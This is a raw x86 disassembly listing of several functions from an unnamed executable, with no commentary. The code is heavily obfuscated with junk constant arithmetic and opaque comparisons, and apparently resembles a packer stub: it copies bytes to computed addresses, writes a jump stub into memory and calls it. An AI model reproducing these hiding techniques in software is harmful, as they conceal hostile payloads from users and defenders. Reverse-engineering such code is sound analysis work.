  41c134:	shr    edx,0x2
  41c137:	mov    edx,DWORD PTR [ebp-0x18]
  41c13a:	mov    esi,DWORD PTR [ebp-0x14]
  41c13d:	xor    eax,ecx
  41c13f:	xor    esi,esi
  41c141:	or     eax,esi
  41c143:	mov    ds:0x42247c,eax
  41c148:	mov    BYTE PTR [ebp-0x6],0x87
  41c14c:	mov    BYTE PTR [ebp-0x5],0x12
  41c150:	mov    BYTE PTR [ebp-0x4],0x2
  41c154:	mov    BYTE PTR [ebp-0x3],0x93
  41c158:	mov    BYTE PTR [ebp-0x2],0x23
  41c15c:	mov    BYTE PTR [ebp-0x1],0x2
  41c160:	mov    al,BYTE PTR [ebp-0x1]
  41c163:	movzx  esi,al
  41c166:	mov    al,BYTE PTR [ebp-0x2]
  41c169:	movzx  eax,al
  41c16c:	shl    edx,0x1e
  41c16f:	cdq    
  41c170:	idiv   esi
  41c172:	mov    dl,BYTE PTR [ebp-0x3]
  41c175:	movzx  edx,dl
  41c178:	movzx  eax,al
  41c17b:	or     eax,edx
  41c17d:	mov    dl,BYTE PTR [ebp-0x4]
  41c180:	movzx  esi,dl
  41c183:	cdq    
  41c184:	idiv   esi
  41c186:	mov    dl,BYTE PTR [ebp-0x5]
  41c189:	movzx  esi,dl
  41c18c:	movzx  eax,al
  41c18f:	cdq    
  41c190:	idiv   esi
  41c192:	movzx  edx,BYTE PTR [ebp-0x6]
  41c196:	and    eax,edx
  41c198:	mov    BYTE PTR [ebp-0x4],al
  41c19b:	mov    BYTE PTR [ebp-0x5],0x66
  41c19f:	mov    BYTE PTR [ebp-0x6],0xcb
  41c1a3:	mov    al,BYTE PTR [ebp-0x6]
  41c1a6:	mov    dl,BYTE PTR [ebp-0x5]
  41c1a9:	add    al,dl
  41c1ab:	add    al,0x48
  41c1ad:	mov    dl,0xe8
  41c1af:	imul   dl
  41c1b1:	mov    dl,BYTE PTR [ebp-0x4]
  41c1b4:	cmp    dl,al
  41c1b6:	ja     0x41c1dd
  41c1bc:	mov    eax,DWORD PTR [ebp-0x18]
  41c1bf:	mov    edx,DWORD PTR [ebp-0x14]
  41c1c2:	shrd   eax,edx,0x2
  41c1c6:	xor    eax,ecx
  41c1c8:	mov    ecx,DWORD PTR [ebp-0x18]
  41c1cb:	shr    edx,0x2
  41c1ce:	mov    edx,DWORD PTR [ebp-0x14]
  41c1d1:	xor    edx,edx
  41c1d3:	shl    ecx,0x1e
  41c1d6:	or     eax,edx
  41c1d8:	mov    ds:0x422370,eax
  41c1dd:	pop    esi
  41c1de:	leave  
  41c1df:	ret    
  41c1e0:	push   ebp
  41c1e1:	mov    ebp,esp
  41c1e3:	sub    esp,0x28
  41c1e6:	push   ebx
  41c1e7:	push   esi
  41c1e8:	push   edi
  41c1e9:	mov    DWORD PTR [ebp-0x10],0x67e2
  41c1f0:	mov    DWORD PTR [ebp-0x4],0x4726
  41c1f7:	mov    DWORD PTR [ebp-0x8],0x580
  41c1fe:	mov    DWORD PTR [ebp-0xc],0x5f3e
  41c205:	mov    DWORD PTR [ebp-0x28],0x3294
  41c20c:	mov    DWORD PTR [ebp-0x24],0x643
  41c213:	mov    DWORD PTR [ebp-0x20],0x2545
  41c21a:	mov    DWORD PTR [ebp-0x1c],0x43ab
  41c221:	xor    ebx,ebx
  41c223:	inc    ebx
  41c224:	mov    DWORD PTR [ebp-0x18],ebx
  41c227:	mov    DWORD PTR [ebp-0x14],0x76b1
  41c22e:	mov    ecx,DWORD PTR [ebp-0x8]
  41c231:	mov    eax,DWORD PTR [ebp-0x4]
  41c234:	sub    ecx,eax
  41c236:	add    ecx,DWORD PTR [ebp-0xc]
  41c239:	add    ecx,DWORD PTR [ebp-0x10]
  41c23c:	imul   ecx,ecx,0x1f80
  41c242:	add    ecx,0x727e
  41c248:	xor    ecx,0x106c92f2
  41c24e:	mov    DWORD PTR [ebp-0x8],0x113c
  41c255:	mov    DWORD PTR [ebp-0xc],0x3d61
  41c25c:	mov    DWORD PTR [ebp-0x10],0x16e9
  41c263:	mov    DWORD PTR [ebp-0x4],0x21aa
  41c26a:	mov    eax,DWORD PTR [ebp-0x10]
  41c26d:	or     eax,0x3611
  41c272:	add    eax,DWORD PTR [ebp-0xc]
  41c275:	mov    edx,DWORD PTR [ebp-0x8]
  41c278:	and    eax,edx
  41c27a:	mov    edx,ecx
  41c27c:	sub    edx,eax
  41c27e:	mov    eax,DWORD PTR [ebp-0x4]
  41c281:	mov    esi,DWORD PTR ds:0x422268
  41c287:	mov    esi,DWORD PTR [esi+0x1cc]
  41c28d:	add    eax,0x6772
  41c292:	or     eax,0x1f24
  41c297:	sub    eax,0x7046
  41c29c:	xor    eax,0x497a
  41c2a1:	sub    esi,eax
  41c2a3:	mov    eax,DWORD PTR [ebp+0x8]
  41c2a6:	mov    al,BYTE PTR [edx+eax*1-0x5774]
  41c2ad:	mov    BYTE PTR [esi+ecx*1],al
  41c2b0:	mov    eax,DWORD PTR [ebp-0x14]
  41c2b3:	mov    esi,DWORD PTR [ebp-0x18]
  41c2b6:	and    eax,0x2389
  41c2bb:	xor    eax,0x695
  41c2c0:	xor    edx,edx
  41c2c2:	div    esi
  41c2c4:	lea    ecx,[ecx+eax*1-0x2413]
  41c2cb:	mov    eax,DWORD PTR [ebp-0x1c]
  41c2ce:	add    eax,DWORD PTR [ebp-0x20]
  41c2d1:	mov    edx,DWORD PTR [ebp-0x24]
  41c2d4:	and    eax,edx
  41c2d6:	mov    edx,DWORD PTR [ebp-0x28]
  41c2d9:	imul   eax,edx
  41c2dc:	mov    edx,0xd0c8f
  41c2e1:	sub    edx,eax
  41c2e3:	cmp    ecx,edx
  41c2e5:	jbe    0x41c24e
  41c2eb:	push   0x2
  41c2ed:	pop    eax
  41c2ee:	mov    DWORD PTR [ebp-0x1c],eax
  41c2f1:	mov    DWORD PTR [ebp-0x20],ebx
  41c2f4:	mov    DWORD PTR [ebp-0x24],0x5
  41c2fb:	mov    DWORD PTR [ebp-0x28],0x6686
  41c302:	mov    DWORD PTR [ebp-0x8],0x7cf1
  41c309:	mov    DWORD PTR [ebp-0x4],eax
  41c30c:	mov    DWORD PTR [ebp+0x8],0x739a
  41c313:	mov    DWORD PTR [ebp-0xc],0xf3a
  41c31a:	xor    edx,edx
  41c31c:	mov    DWORD PTR [ebp-0x10],0x429
  41c323:	mov    eax,DWORD PTR [ebp-0x28]
  41c326:	mov    ecx,DWORD PTR [ebp-0x24]
  41c329:	sub    eax,0x175c
  41c32e:	div    ecx
  41c330:	mov    ecx,DWORD PTR [ebp-0x20]
  41c333:	xor    edx,edx
  41c335:	mov    edi,0x4db5
  41c33a:	div    ecx
  41c33c:	mov    ecx,DWORD PTR [ebp-0x1c]
  41c33f:	xor    edx,edx
  41c341:	div    ecx
  41c343:	xor    edx,edx
  41c345:	mov    ecx,eax
  41c347:	mov    eax,DWORD PTR [ebp+0x8]
  41c34a:	imul   ecx,ecx,0x2e01
  41c350:	mov    esi,DWORD PTR [ebp-0x4]
  41c353:	add    eax,edi
  41c355:	div    esi
  41c357:	mov    edx,DWORD PTR [ebp-0x8]
  41c35a:	mov    esi,0x940a7
  41c35f:	sub    ecx,0x16bea86
  41c365:	sub    eax,edx
  41c367:	xor    edx,edx
  41c369:	div    esi
  41c36b:	mov    esi,0xdbd
  41c370:	add    eax,esi
  41c372:	cmp    ecx,eax
  41c374:	jae    0x41c435
  41c37a:	mov    DWORD PTR [ebp-0x1c],0x2d7e
  41c381:	mov    DWORD PTR [ebp-0x20],0x383e
  41c388:	mov    DWORD PTR [ebp-0x24],0x3a3a
  41c38f:	mov    DWORD PTR [ebp-0x14],0x13cd
  41c396:	xor    edx,edx
  41c398:	mov    DWORD PTR [ebp-0x18],0x187
  41c39f:	mov    DWORD PTR [ebp-0x28],0x3224
  41c3a6:	mov    eax,DWORD PTR [ebp-0x28]
  41c3a9:	push   0x6
  41c3ab:	pop    ebx
  41c3ac:	div    ebx
  41c3ae:	mov    edx,eax
  41c3b0:	mov    eax,ds:0x422268
  41c3b5:	mov    eax,DWORD PTR [eax+0x1d0]
  41c3bb:	sub    eax,edx
  41c3bd:	mov    edx,DWORD PTR [ebp-0x24]
  41c3c0:	mov    ebx,DWORD PTR [ebp-0x20]
  41c3c3:	imul   edx,ebx
  41c3c6:	mov    ebx,DWORD PTR [ebp-0x1c]
  41c3c9:	xor    edx,ebx
  41c3cb:	sub    edx,0x26bd
  41c3d1:	add    eax,ecx
  41c3d3:	and    edx,0x7126
  41c3d9:	mov    ebx,ecx
  41c3db:	sub    ebx,edx
  41c3dd:	mov    edx,DWORD PTR [ebp-0x18]
  41c3e0:	sub    eax,edx
  41c3e2:	mov    edx,DWORD PTR [ebp-0x14]
  41c3e5:	sub    eax,edx
  41c3e7:	mov    edx,DWORD PTR [ebp+0xc]
  41c3ea:	mov    dl,BYTE PTR [ebx+edx*1+0x16c0]
  41c3f1:	mov    BYTE PTR [eax-0xbb5],dl
  41c3f7:	mov    eax,DWORD PTR [ebp-0x10]
  41c3fa:	xor    eax,0xffffe1ce
  41c3ff:	add    eax,DWORD PTR [ebp-0xc]
  41c402:	xor    edx,edx
  41c404:	and    eax,0x6d33
  41c409:	lea    ecx,[ecx+eax*1-0x6520]
  41c410:	mov    eax,DWORD PTR [ebp+0x8]
  41c413:	mov    ebx,DWORD PTR [ebp-0x4]
  41c416:	add    eax,edi
  41c418:	div    ebx
  41c41a:	mov    edx,DWORD PTR [ebp-0x8]
  41c41d:	mov    ebx,0x940a7
  41c422:	sub    eax,edx
  41c424:	xor    edx,edx
  41c426:	div    ebx
  41c428:	add    eax,esi
  41c42a:	cmp    ecx,eax
  41c42c:	jb     0x41c37a
  41c432:	xor    ebx,ebx
  41c434:	inc    ebx
  41c435:	mov    DWORD PTR [ebp+0xc],0x77bd
  41c43c:	mov    DWORD PTR [ebp+0x8],0x4f2a
  41c443:	mov    DWORD PTR [ebp-0x8],0x4738
  41c44a:	mov    DWORD PTR [ebp-0xc],0x6c4e
  41c451:	mov    DWORD PTR [ebp-0x10],0x7f0d
  41c458:	mov    DWORD PTR [ebp-0x14],0x64ec
  41c45f:	mov    DWORD PTR [ebp-0x18],0x1984
  41c466:	mov    DWORD PTR [ebp-0x1c],0x293
  41c46d:	mov    eax,DWORD PTR [ebp+0x8]
  41c470:	mov    ecx,DWORD PTR [ebp+0xc]
  41c473:	add    eax,0x1ef2
  41c478:	and    eax,ecx
  41c47a:	xor    eax,0x7240
  41c47f:	mov    ecx,0x7aaa
  41c484:	sub    ecx,eax
  41c486:	mov    DWORD PTR [ebp+0xc],0x8d3
  41c48d:	mov    DWORD PTR [ebp+0x8],0x2392
  41c494:	mov    DWORD PTR [ebp-0x20],ebx
  41c497:	mov    DWORD PTR [ebp-0x24],0x338f
  41c49e:	mov    DWORD PTR [ebp-0x28],0x61c9
  41c4a5:	mov    eax,DWORD PTR [ebp+0x8]
  41c4a8:	mov    edx,DWORD PTR [ebp+0xc]
  41c4ab:	imul   eax,edx
  41c4ae:	xor    eax,0x40a0
  41c4b3:	or     eax,0x1a48
  41c4b8:	xor    eax,0x139ddb0
  41c4bd:	mov    esi,ecx
  41c4bf:	sub    esi,eax
  41c4c1:	mov    eax,DWORD PTR [ebp-0x28]
  41c4c4:	mov    edx,DWORD PTR [ebp-0x24]
  41c4c7:	mov    edi,DWORD PTR [ebp-0x20]
  41c4ca:	or     eax,0x1cc2
  41c4cf:	sub    eax,edx
  41c4d1:	xor    edx,edx
  41c4d3:	div    edi
  41c4d5:	mov    edx,DWORD PTR ds:0x422268
  41c4db:	mov    edx,DWORD PTR [edx+0x1d4]
  41c4e1:	sub    edx,eax
  41c4e3:	mov    eax,DWORD PTR [ebp+0x10]
  41c4e6:	mov    al,BYTE PTR [esi+eax*1]
  41c4e9:	mov    BYTE PTR [edx+ecx*1-0x1c12],al
  41c4f0:	mov    eax,DWORD PTR [ebp-0x1c]
  41c4f3:	mov    edx,DWORD PTR [ebp-0x18]
  41c4f6:	imul   eax,edx
  41c4f9:	mov    edx,DWORD PTR [ebp-0x14]
  41c4fc:	imul   eax,eax,0x262b
  41c502:	or     eax,edx
  41c504:	mov    edx,DWORD PTR [ebp-0x10]
  41c507:	or     eax,edx
  41c509:	xor    eax,0x59f6
  41c50e:	lea    ecx,[ecx+eax*1+0x350559e6]
  41c515:	mov    eax,DWORD PTR [ebp-0xc]
  41c518:	and    eax,0xddc
  41c51d:	add    eax,DWORD PTR [ebp-0x8]
  41c520:	xor    eax,0x46e3
  41c525:	add    eax,0x50eb
  41c52a:	cmp    ecx,eax
  41c52c:	jne    0x41c486
  41c532:	pop    edi
  41c533:	pop    esi
  41c534:	pop    ebx
  41c535:	leave  
  41c536:	ret    0xc
  41c539:	push   ebp
  41c53a:	mov    ebp,esp
  41c53c:	sub    esp,0xec
  41c542:	push   ebx
  41c543:	push   esi
  41c544:	mov    DWORD PTR [ebp-0x8],0x548e
  41c54b:	mov    DWORD PTR [ebp-0x4],0x61c2
  41c552:	mov    eax,DWORD PTR [ebp-0x4]
  41c555:	mov    ecx,DWORD PTR [ebp-0x8]
  41c558:	add    eax,0x1ca5
  41c55d:	or     eax,ecx
  41c55f:	mov    ecx,DWORD PTR ds:0x422268
  41c565:	lea    eax,[eax+ecx*1-0x7eef]
  41c56c:	mov    DWORD PTR [ebp-0x5c],eax
  41c56f:	mov    DWORD PTR [ebp-0x4],0x8ea
  41c576:	mov    DWORD PTR [ebp-0x8],0x5759
  41c57d:	mov    eax,DWORD PTR [ebp-0x8]
  41c580:	mov    ecx,DWORD PTR [ebp-0x4]
  41c583:	and    eax,0x27f6
  41c588:	xor    eax,ecx
  41c58a:	mov    ecx,DWORD PTR ds:0x42239c
  41c590:	imul   eax,eax,0x18
  41c593:	xor    eax,0x17970
  41c598:	lea    eax,[ebp+eax*1-0x54]
  41c59c:	mov    DWORD PTR [eax],ecx
  41c59e:	mov    DWORD PTR [ebp-0x4],0x7584
  41c5a5:	mov    DWORD PTR [ebp-0x8],0x7c9f
  41c5ac:	mov    eax,DWORD PTR [ebp-0x8]
  41c5af:	xor    edx,edx
  41c5b1:	push   0x3
  41c5b3:	pop    ecx
  41c5b4:	div    ecx
  41c5b6:	mov    ecx,DWORD PTR [ebp-0x4]
  41c5b9:	xor    edx,edx
  41c5bb:	push   0x2
  41c5bd:	add    eax,0x14d3
  41c5c2:	and    eax,ecx
  41c5c4:	mov    ecx,0x6404
  41c5c9:	sub    ecx,eax
  41c5cb:	mov    DWORD PTR [ebp-0x74],ecx
  41c5ce:	mov    DWORD PTR [ebp-0xc],0x13b5
  41c5d5:	mov    DWORD PTR [ebp-0x8],0x2e54
  41c5dc:	mov    DWORD PTR [ebp-0x4],0x2f11
  41c5e3:	mov    eax,DWORD PTR [ebp-0x8]
  41c5e6:	mov    ecx,DWORD PTR [ebp-0x4]
  41c5e9:	lea    eax,[ecx+eax*1-0x65ec]
  41c5f0:	mov    ecx,0x5e208
  41c5f5:	div    ecx
  41c5f7:	mov    ecx,DWORD PTR [ebp-0xc]
  41c5fa:	lea    eax,[eax+ecx*1+0x40c7]
  41c601:	mov    DWORD PTR [ebp-0x24],eax
  41c604:	mov    DWORD PTR [ebp-0x4],0x1bc6
  41c60b:	mov    DWORD PTR [ebp-0x8],0x16ac
  41c612:	mov    DWORD PTR [ebp-0xc],0x2185
  41c619:	mov    eax,DWORD PTR [ebp-0xc]
  41c61c:	mov    ecx,DWORD PTR [ebp-0x8]
  41c61f:	xor    eax,0x1f75
  41c624:	sub    eax,ecx
  41c626:	mov    ecx,DWORD PTR [ebp-0x4]
  41c629:	sub    eax,ecx
  41c62b:	xor    eax,0xc3e
  41c630:	mov    DWORD PTR [ebp-0x58],eax
  41c633:	mov    DWORD PTR [ebp-0x14],0x66bd
  41c63a:	pop    ecx
  41c63b:	mov    DWORD PTR [ebp-0x4],ecx
  41c63e:	mov    DWORD PTR [ebp-0x8],0x3374
  41c645:	mov    DWORD PTR [ebp-0xc],0x3c31
  41c64c:	mov    eax,DWORD PTR [ebp-0xc]
  41c64f:	mov    edx,DWORD PTR [ebp-0x8]
  41c652:	mov    esi,DWORD PTR [ebp-0x4]
  41c655:	xor    eax,edx
  41c657:	xor    edx,edx
  41c659:	div    esi
  41c65b:	mov    edx,DWORD PTR [ebp-0x14]
  41c65e:	and    eax,edx
  41c660:	sub    eax,0x680
  41c665:	mov    DWORD PTR [ebp-0x24],eax
  41c668:	mov    DWORD PTR [ebp-0x30],0x5f68
  41c66f:	mov    DWORD PTR [ebp-0x2c],0x398b
  41c676:	mov    DWORD PTR [ebp-0x4],0x5034
  41c67d:	mov    DWORD PTR [ebp-0x8],0x7cbf
  41c684:	mov    DWORD PTR [ebp-0xc],0x4f6c
  41c68b:	mov    DWORD PTR [ebp-0x14],0xee2
  41c692:	mov    eax,DWORD PTR [ebp-0x14]
  41c695:	add    eax,DWORD PTR [ebp-0xc]
  41c698:	mov    edx,DWORD PTR [ebp-0x8]
  41c69b:	xor    eax,edx
  41c69d:	mov    edx,DWORD PTR [ebp-0x4]
  41c6a0:	or     eax,edx
  41c6a2:	mov    edx,DWORD PTR [ebp-0x2c]
  41c6a5:	or     eax,edx
  41c6a7:	mov    edx,DWORD PTR [ebp-0x30]
  41c6aa:	and    eax,edx
  41c6ac:	mov    edx,0x5b68
  41c6b1:	sub    edx,eax
  41c6b3:	mov    DWORD PTR [ebp-0x24],edx
  41c6b6:	mov    DWORD PTR [ebp-0x48],0x3308
  41c6bd:	mov    DWORD PTR [ebp-0x44],0x59a4
  41c6c4:	mov    DWORD PTR [ebp-0x38],0x2775
  41c6cb:	mov    DWORD PTR [ebp-0x34],0x4da
  41c6d2:	mov    DWORD PTR [ebp-0x40],0x49d8
  41c6d9:	mov    DWORD PTR [ebp-0x3c],0x1b5c
  41c6e0:	mov    DWORD PTR [ebp-0x28],0x338c
  41c6e7:	mov    DWORD PTR [ebp-0x24],0x68ed
  41c6ee:	mov    DWORD PTR [ebp-0x20],0x2a7b
  41c6f5:	mov    DWORD PTR [ebp-0x1c],0x718f
  41c6fc:	mov    eax,DWORD PTR [ebp-0x20]
  41c6ff:	mov    edx,DWORD PTR [ebp-0x1c]
  41c702:	mov    esi,DWORD PTR [ebp-0x28]
  41c705:	mov    ebx,DWORD PTR [ebp-0x24]
  41c708:	add    eax,0xffffc948
  41c70d:	adc    edx,0xffff87b0
  41c713:	or     eax,esi
  41c715:	mov    esi,DWORD PTR [ebp-0x40]
  41c718:	or     eax,esi
  41c71a:	or     edx,ebx
  41c71c:	mov    ebx,DWORD PTR [ebp-0x3c]
  41c71f:	mov    esi,DWORD PTR [ebp-0x38]
  41c722:	or     edx,ebx
  41c724:	mov    ebx,DWORD PTR [ebp-0x34]
  41c727:	sub    eax,esi
  41c729:	mov    esi,DWORD PTR [ebp-0x48]
  41c72c:	sbb    edx,ebx
  41c72e:	mov    ebx,DWORD PTR [ebp-0x44]
  41c731:	or     eax,esi
  41c733:	or     edx,ebx
  41c735:	add    eax,0x89b
  41c73a:	mov    DWORD PTR [ebp-0x20],eax
  41c73d:	adc    edx,0x5a
  41c740:	mov    DWORD PTR [ebp-0x1c],edx
  41c743:	mov    DWORD PTR [ebp-0x80],0xfa4
  41c74a:	mov    DWORD PTR [ebp-0x70],0x618e
  41c751:	mov    DWORD PTR [ebp-0x6c],0x811
  41c758:	mov    DWORD PTR [ebp-0x98],0x42d6904a
  41c762:	mov    DWORD PTR [ebp-0x94],0xe82c1
  41c76c:	mov    DWORD PTR [ebp-0x88],0x58ff
  41c776:	mov    DWORD PTR [ebp-0x84],0x7394
  41c780:	xor    eax,eax
  41c782:	inc    eax
  41c783:	mov    DWORD PTR [ebp-0x64],eax
  41c786:	mov    DWORD PTR [ebp-0x8],0x5f59
  41c78d:	mov    DWORD PTR [ebp-0x4],0x652b
  41c794:	mov    DWORD PTR [ebp-0xc],0xf43
  41c79b:	mov    DWORD PTR [ebp-0x14],0x22dc
  41c7a2:	mov    DWORD PTR [ebp-0x2c],0x45d4
  41c7a9:	mov    DWORD PTR [ebp-0x30],0x28e1
  41c7b0:	mov    DWORD PTR [ebp-0x7c],0x5e09
  41c7b7:	mov    DWORD PTR [ebp-0x50],0x3910
  41c7be:	mov    DWORD PTR [ebp-0x3c],0x5c97
  41c7c5:	mov    DWORD PTR [ebp-0x24],0x6111
  41c7cc:	mov    DWORD PTR [ebp-0x78],ecx
  41c7cf:	mov    DWORD PTR [ebp-0x34],ecx
  41c7d2:	mov    DWORD PTR [ebp-0x44],0x207a
  41c7d9:	mov    DWORD PTR [ebp-0x60],eax
  41c7dc:	mov    DWORD PTR [ebp-0x8c],0x7840
  41c7e6:	mov    DWORD PTR [ebp-0x4c],0x6b0b
  41c7ed:	mov    eax,DWORD PTR [ebp-0x30]
  41c7f0:	or     eax,0x70c5
  41c7f5:	add    eax,DWORD PTR [ebp-0x2c]
  41c7f8:	mov    ecx,DWORD PTR [ebp-0x14]
  41c7fb:	or     eax,ecx
  41c7fd:	mov    ecx,0xce40
  41c802:	sub    ecx,eax
  41c804:	mov    eax,DWORD PTR [ebp-0xc]
  41c807:	sub    ecx,eax
  41c809:	imul   ecx,ecx,0x7480
  41c80f:	add    ecx,DWORD PTR [ebp-0x58]
  41c812:	mov    eax,DWORD PTR [ebp-0x8]
  41c815:	push   ecx
  41c816:	mov    ecx,DWORD PTR [ebp-0x4]
  41c819:	lea    eax,[ecx+eax*1-0x1e6d]
  41c820:	mov    ecx,DWORD PTR [ebp-0x64]
  41c823:	xor    edx,edx
  41c825:	div    ecx
  41c827:	mov    ecx,DWORD PTR [ebp-0x74]
  41c82a:	lea    eax,[eax+ecx*1-0xa617]
  41c831:	push   eax
  41c832:	mov    eax,DWORD PTR [ebp-0x88]
  41c838:	mov    ecx,DWORD PTR [ebp-0x84]
  41c83e:	push   0x770a
  41c843:	push   0x2a0c
  41c848:	push   ecx
  41c849:	push   eax
  41c84a:	call   0x41e026
  41c84f:	mov    ecx,DWORD PTR [ebp-0x98]
  41c855:	mov    esi,DWORD PTR [ebp-0x94]
  41c85b:	push   esi
  41c85c:	push   ecx
  41c85d:	or     edx,0x615d
  41c863:	or     eax,0x455c
  41c868:	push   edx
  41c869:	push   eax
  41c86a:	call   0x421b6b
  41c86f:	mov    ecx,DWORD PTR [ebp-0x70]
  41c872:	mov    edx,DWORD PTR [ebp-0x6c]
  41c875:	xor    eax,ecx
  41c877:	mov    ecx,DWORD PTR [ebp-0x20]
  41c87a:	mov    edx,DWORD PTR [ebp-0x1c]
  41c87d:	mov    esi,DWORD PTR [ebp-0x80]
  41c880:	and    eax,0xb49
  41c885:	add    esi,0x629b
  41c88b:	lea    eax,[eax+ecx*1-0xfd]
  41c892:	xor    esi,0x4994
  41c898:	push   eax
  41c899:	lea    esi,[ebp+esi*1-0x3c93]
  41c8a0:	call   0x41ca4c
  41c8a5:	mov    ecx,eax
  41c8a7:	mov    eax,DWORD PTR [ebp-0x50]
  41c8aa:	mov    edx,DWORD PTR [ebp-0x7c]
  41c8ad:	sub    eax,0x161
  41c8b2:	xor    eax,edx
  41c8b4:	imul   eax,eax,0x5151
  41c8ba:	add    eax,0x3901
  41c8bf:	xor    eax,0x40c2
  41c8c4:	xor    edx,edx
  41c8c6:	mov    esi,0x218f6c45
  41c8cb:	div    esi
  41c8cd:	cmp    ecx,eax
  41c8cf:	jne    0x41ca3c
  41c8d5:	mov    ecx,DWORD PTR [ebp-0x78]
  41c8d8:	xor    edx,edx
  41c8da:	mov    eax,0x209c
  41c8df:	div    ecx
  41c8e1:	mov    ecx,DWORD PTR ds:0x422268
  41c8e7:	mov    ecx,DWORD PTR [ecx+0x1a8]
  41c8ed:	xor    edx,edx
  41c8ef:	sub    ecx,eax
  41c8f1:	mov    eax,DWORD PTR [ebp-0x4c]
  41c8f4:	xor    eax,0x3daa
  41c8f9:	sub    eax,0x3375
  41c8fe:	or     eax,0x6931
  41c903:	lea    eax,[ebp+eax*1-0x6c25]
  41c90a:	push   eax
  41c90b:	mov    eax,DWORD PTR [ebp-0x8c]
  41c911:	push   0x18
  41c913:	pop    esi
  41c914:	div    esi
  41c916:	mov    esi,DWORD PTR [ebp-0x60]
  41c919:	xor    edx,edx
  41c91b:	div    esi
  41c91d:	mov    edx,DWORD PTR [ebp-0x44]
  41c920:	mov    esi,DWORD PTR [ebp-0x34]
  41c923:	xor    eax,edx
  41c925:	xor    edx,edx
  41c927:	div    esi
  41c929:	imul   eax,eax,0x7d2a
  41c92f:	sub    eax,0x928ded7
  41c934:	push   eax
  41c935:	mov    eax,ds:0x422268
  41c93a:	add    eax,0xaa
  41c93f:	push   eax
  41c940:	mov    eax,DWORD PTR [ebp-0x3c]
  41c943:	sub    ecx,eax
  41c945:	mov    eax,DWORD PTR [ebp-0x24]
  41c948:	push   DWORD PTR [ecx+eax*1+0xbd4]
  41c94f:	call   0x41f8ac
  41c954:	mov    DWORD PTR [ebp-0x4],eax
  41c957:	mov    ecx,DWORD PTR ds:0x422370
  41c95d:	lea    eax,[ebp+0x4]
  41c960:	mov    DWORD PTR [ecx*4+0x422368],eax
  41c967:	inc    DWORD PTR ds:0x422370
  41c96d:	mov    eax,DWORD PTR [ebp-0x4]
  41c970:	mov    eax,DWORD PTR [ebp-0x4]
  41c973:	xor    edx,edx
  41c975:	shld   edx,eax,0x2
  41c979:	shl    eax,0x2
  41c97c:	mov    ecx,0xba699573
  41c981:	mov    esi,0x9c0a89d8
  41c986:	xor    eax,ecx
  41c988:	xor    edx,esi
  41c98a:	cmp    eax,ecx
  41c98c:	jne    0x41c9a6
  41c992:	cmp    edx,esi
  41c994:	jne    0x41c9a6
  41c99a:	mov    eax,0xba699577
  41c99f:	mov    edx,esi
  41c9a1:	jmp    0x41ca46
  41c9a6:	lea    eax,[ebp-0x10]
  41c9a9:	mov    DWORD PTR [ebp-0x9c],eax
  41c9af:	mov    eax,DWORD PTR [ebp-0x54]
  41c9b2:	mov    DWORD PTR [ebp-0x10],eax
  41c9b5:	mov    eax,DWORD PTR [ebp-0x10]
  41c9b8:	mov    ecx,DWORD PTR [ebp-0x4]
  41c9bb:	sub    eax,ecx
  41c9bd:	mov    DWORD PTR [ebp-0x10],eax
  41c9c0:	mov    eax,DWORD PTR [ebp-0x20]
  41c9c3:	mov    ecx,DWORD PTR [ebp-0x1c]
  41c9c6:	sub    DWORD PTR [ebp-0x10],eax
  41c9c9:	mov    eax,DWORD PTR [ebp-0x4]
  41c9cc:	mov    DWORD PTR [eax],0x658776e9
  41c9d2:	mov    DWORD PTR [eax+0x4],0xab756547
  41c9d9:	mov    eax,DWORD PTR [ebp-0x10]
  41c9dc:	mov    ecx,DWORD PTR [ebp-0x4]
  41c9df:	mov    DWORD PTR [ecx+0x1],eax
  41c9e2:	mov    eax,ds:0x4220e4
  41c9e7:	push   DWORD PTR [eax]
  41c9e9:	push   DWORD PTR ds:0x422358
  41c9ef:	push   DWORD PTR ds:0x4220ec
  41c9f5:	push   DWORD PTR ds:0x422338
  41c9fb:	push   DWORD PTR ds:0x4223ac
  41ca01:	push   0xa3e69a99
  41ca06:	push   0xa3e69a9d
  41ca0b:	push   DWORD PTR [ebp-0x5c]
  41ca0e:	mov    eax,DWORD PTR [ebp-0x4]
  41ca11:	call   eax
  41ca13:	mov    eax,DWORD PTR [edi]
  41ca15:	mov    eax,DWORD PTR [ebp+0x8]
  41ca18:	push   DWORD PTR [eax]
  41ca1a:	call   0x41cc3c
  41ca1f:	mov    eax,ds:0x422268
  41ca24:	push   0x4
  41ca26:	add    eax,0x1dc
  41ca2b:	push   eax
  41ca2c:	push   edi
  41ca2d:	call   0x41d37f
  41ca32:	mov    eax,0xba69957b
  41ca37:	jmp    0x41c99f
  41ca3c:	mov    eax,0xba699573
  41ca41:	mov    edx,0x9c0a89d8
  41ca46:	pop    esi
  41ca47:	pop    ebx
  41ca48:	leave  
  41ca49:	ret    0x4
  41ca4c:	push   ebp
  41ca4d:	mov    ebp,esp
  41ca4f:	sub    esp,0x20
  41ca52:	push   ebx
  41ca53:	push   edi
  41ca54:	mov    DWORD PTR [ebp-0x8],0x522e
  41ca5b:	mov    DWORD PTR [ebp-0x4],0x3dbd
  41ca62:	mov    DWORD PTR [ebp-0x10],0x53f1
  41ca69:	mov    DWORD PTR [ebp-0xc],0x631b
  41ca70:	mov    DWORD PTR [ebp-0x18],0x524d
  41ca77:	mov    DWORD PTR [ebp-0x14],0x1600
  41ca7e:	mov    eax,DWORD PTR [ebp-0x18]
  41ca81:	mov    ecx,DWORD PTR [ebp-0x14]
  41ca84:	mov    edx,DWORD PTR [ebp-0x10]
  41ca87:	mov    edi,DWORD PTR [ebp-0xc]
  41ca8a:	push   edi
  41ca8b:	push   edx
  41ca8c:	push   ecx
  41ca8d:	push   eax
  41ca8e:	call   0x41e026
  41ca93:	mov    ecx,DWORD PTR [ebp-0x8]
  41ca96:	mov    edi,DWORD PTR [ebp-0x4]
  41ca99:	add    eax,0x1dc8
  41ca9e:	adc    edx,0x6fbf
  41caa4:	and    edx,edi
  41caa6:	push   0x1061
  41caab:	and    eax,ecx
  41caad:	or     edx,0x23ff
  41cab3:	push   0x4000022f
  41cab8:	or     eax,0x58c4
  41cabd:	xor    edx,0x7a7a
  41cac3:	xor    eax,0x5278
  41cac8:	push   edx
  41cac9:	push   eax
  41caca:	call   0x421b6b
  41cacf:	mov    DWORD PTR [esi],eax
  41cad1:	mov    DWORD PTR [ebp-0x20],0x3354
  41cad8:	mov    DWORD PTR [ebp-0x1c],0x7d8c
  41cadf:	mov    DWORD PTR [ebp-0x18],0x3d36
  41cae6:	mov    DWORD PTR [ebp-0x14],0x51ef
  41caed:	xor    edi,edi
  41caef:	mov    DWORD PTR [ebp-0xc],0x3358
